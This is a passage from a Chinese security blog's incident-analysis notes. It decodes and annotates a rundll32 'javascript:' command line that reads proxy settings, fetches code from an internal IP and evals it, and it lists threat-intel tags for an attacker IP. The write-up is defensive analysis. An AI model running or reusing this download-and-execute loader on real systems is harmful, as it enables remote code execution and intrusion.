+<h2 id="命令行-2"><a href="#命令行-2" class="headerlink" title="命令行"></a>命令行</h2><p>rundll32.exe  javascript:”/../mshtml,RunHTMLApplication “;document.write();h=new%20ActiveXObject(“WinHttp.WinHttpRequest.5.1”);w=new%20ActiveXObject(“WScript.Shell”);try{v=w.RegRead(“HKCU//Software//Microsoft//Windows//CurrentVersion//Internet%20Settings//ProxyServer”);q=v.split(“=”)[1].split(“;”)[0];h.SetProxy(2,q);}catch(e){}h.Open(“GET”,”<a href="http://192.168.2.91/connect&quot;,false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run" target="_blank" rel="noopener">http://192.168.2.91/connect&quot;,false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run</a>(“cmd /c taskkill /f /im rundll32.exe”,0,true);}</p>
+<h1 id="分析结果-4"><a href="#分析结果-4" class="headerlink" title="分析结果"></a>分析结果</h1><p>命令行解码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write();h=new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);w=new ActiveXObject(&quot;WScript.Shell&quot;);try&#123;v=w.RegRead(&quot;HKCU//Software//Microsoft//Windows//CurrentVersion//Internet Settings//ProxyServer&quot;);q=v.split(&quot;=&quot;)[1].split(&quot;;&quot;)[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(&quot;GET&quot;,&quot;http://192.168.2.91/connect&quot;,false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>run32dll调用js代码。</p>
+<h2 id="javascript代码解析"><a href="#javascript代码解析" class="headerlink" title="javascript代码解析"></a>javascript代码解析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">w=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    v=w.RegRead(<span class="string">"HKCU//Software//Microsoft//Windows//CurrentVersion//Internet Settings//ProxyServer"</span>);<span class="comment">//读取注册表以获取代理服务器的配置用在后面的连接中</span></span><br><span class="line">    q=v.split(<span class="string">"="</span>)[<span class="number">1</span>].split(<span class="string">";"</span>)[<span class="number">0</span>];</span><br><span class="line">    h.SetProxy(<span class="number">2</span>,q);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">h.Open(<span class="string">"GET"</span>,<span class="string">"http://192.168.2.91/connect"</span>,<span class="literal">false</span>);<span class="comment">//使用代理服务器GWT请求 http://192.168.2.91/connect</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    h.Send();</span><br><span class="line">    B=h.ResponseText;</span><br><span class="line">    <span class="built_in">eval</span>(B);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"cmd /c taskkill /f /im rundll32.exe"</span>,<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用js访问本地局域网中的 <a href="http://192.168.2.91/connect" target="_blank" rel="noopener">http://192.168.2.91/connect</a> ，失败则kill掉run32dll进程。</p>
+<h2 id="IOC分析-2"><a href="#IOC分析-2" class="headerlink" title="IOC分析"></a>IOC分析</h2><ul>
+<li>threatbook标记IP：183.197.254.111存在撞库行为。</li>
+<li>ALPHA标记IP：183.197.254.111为WebAttacker。</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/29/note20200629/" rel="next" title="note20200629">
+                <i class="fa fa-chevron-left"></i> note20200629
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/me.jpg"
+                alt="Ivoripuion" />
+            
+              <p class="site-author-name" itemprop="name">Ivoripuion</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ivoripuion" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1711268@mail.nankai.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#IOCs记录"><span class="nav-number">1.</span> <span class="nav-text">IOCs记录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务内容"><span class="nav-number">2.</span> <span class="nav-text">任务内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GUID"><span class="nav-number">2.1.</span> <span class="nav-text">GUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP"><span class="nav-number">2.2.</span> <span class="nav-text">IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间"><span class="nav-number">2.3.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令行"><span class="nav-number">2.4.</span> <span class="nav-text">命令行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附加命令行"><span class="nav-number">2.5.</span> <span class="nav-text">附加命令行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用户属性分析："><span class="nav-number">2.6.</span> <span class="nav-text">用户属性分析：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附加信息"><span class="nav-number">3.</span> <span class="nav-text">附加信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析结果"><span class="nav-number">4.</span> <span class="nav-text">分析结果</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GUID-1"><span class="nav-number">4.1.</span> <span class="nav-text">GUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP-1"><span class="nav-number">4.2.</span> <span class="nav-text">IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间-1"><span class="nav-number">4.3.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#行为"><span class="nav-number">4.4.</span> <span class="nav-text">行为</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用户属性分析：-1"><span class="nav-number">4.5.</span> <span class="nav-text">用户属性分析：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#处理"><span class="nav-number">5.</span> <span class="nav-text">处理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#行为解释"><span class="nav-number">5.1.</span> <span class="nav-text">行为解释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#沙盒动态分析结果"><span class="nav-number">5.2.</span> <span class="nav-text">沙盒动态分析结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务内容-1"><span class="nav-number">6.</span> <span class="nav-text">任务内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IP-2"><span class="nav-number">6.1.</span> <span class="nav-text">IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间-2"><span class="nav-number">6.2.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内容"><span class="nav-number">6.3.</span> <span class="nav-text">内容</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附加信息-1"><span class="nav-number">7.</span> <span class="nav-text">附加信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析结果-1"><span class="nav-number">8.</span> <span class="nav-text">分析结果</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#行为-1"><span class="nav-number">8.1.</span> <span class="nav-text">行为</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GUID-2"><span class="nav-number">8.2.</span> <span class="nav-text">GUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP-3"><span class="nav-number">8.3.</span> <span class="nav-text">IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间-3"><span class="nav-number">8.4.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内容-1"><span class="nav-number">8.5.</span> <span class="nav-text">内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脚本解释"><span class="nav-number">8.6.</span> <span class="nav-text">脚本解释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IOCs平台查询"><span class="nav-number">8.7.</span> <span class="nav-text">IOCs平台查询</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务内容-2"><span class="nav-number">9.</span> <span class="nav-text">任务内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GUID-3"><span class="nav-number">9.1.</span> <span class="nav-text">GUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP-4"><span class="nav-number">9.2.</span> <span class="nav-text">IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间-4"><span class="nav-number">9.3.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#行为-2"><span class="nav-number">9.4.</span> <span class="nav-text">行为</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用户属性分析：-2"><span class="nav-number">9.5.</span> <span class="nav-text">用户属性分析：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#附加信息-2"><span class="nav-number">10.</span> <span class="nav-text">附加信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析结果-2"><span class="nav-number">11.</span> <span class="nav-text">分析结果</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#js代码分析"><span class="nav-number">11.1.</span> <span class="nav-text">js代码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IOC分析"><span class="nav-number">11.2.</span> <span class="nav-text">IOC分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务处理"><span class="nav-number">12.</span> <span class="nav-text">任务处理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GUID-4"><span class="nav-number">12.1.</span> <span class="nav-text">GUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP-5"><span class="nav-number">12.2.</span> <span class="nav-text">IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间-5"><span class="nav-number">12.3.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令行-1"><span class="nav-number">12.4.</span> <span class="nav-text">命令行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#处理结果"><span class="nav-number">12.5.</span> <span class="nav-text">处理结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#javascript代码解释"><span class="nav-number">12.6.</span> <span class="nav-text">javascript代码解释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IOC分析-1"><span class="nav-number">12.7.</span> <span class="nav-text">IOC分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务内容-3"><span class="nav-number">13.</span> <span class="nav-text">任务内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#防御规则ID"><span class="nav-number">13.1.</span> <span class="nav-text">防御规则ID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#探针ID"><span class="nav-number">13.2.</span> <span class="nav-text">探针ID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#父MD5"><span class="nav-number">13.3.</span> <span class="nav-text">父MD5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#父命令行"><span class="nav-number">13.4.</span> <span class="nav-text">父命令行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#子MD5"><span class="nav-number">13.5.</span> <span class="nav-text">子MD5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#子命令行"><span class="nav-number">13.6.</span> <span class="nav-text">子命令行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#广度"><span class="nav-number">13.7.</span> <span class="nav-text">广度</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析结果-3"><span class="nav-number">14.</span> <span class="nav-text">分析结果</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#家族社团分析"><span class="nav-number">14.1.</span> <span class="nav-text">家族社团分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#传播渠道分析"><span class="nav-number">14.2.</span> <span class="nav-text">传播渠道分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#处理说明"><span class="nav-number">14.3.</span> <span class="nav-text">处理说明</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务内容-4"><span class="nav-number">15.</span> <span class="nav-text">任务内容</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GUID-5"><span class="nav-number">15.1.</span> <span class="nav-text">GUID</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IP-6"><span class="nav-number">15.2.</span> <span class="nav-text">IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间-6"><span class="nav-number">15.3.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令行-2"><span class="nav-number">15.4.</span> <span class="nav-text">命令行</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析结果-4"><span class="nav-number">16.</span> <span class="nav-text">分析结果</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#javascript代码解析"><span class="nav-number">16.1.</span> <span class="nav-text">javascript代码解析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IOC分析-2"><span class="nav-number">16.2.</span> <span class="nav-text">IOC分析</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ivoripuion</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":225,"height":450},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
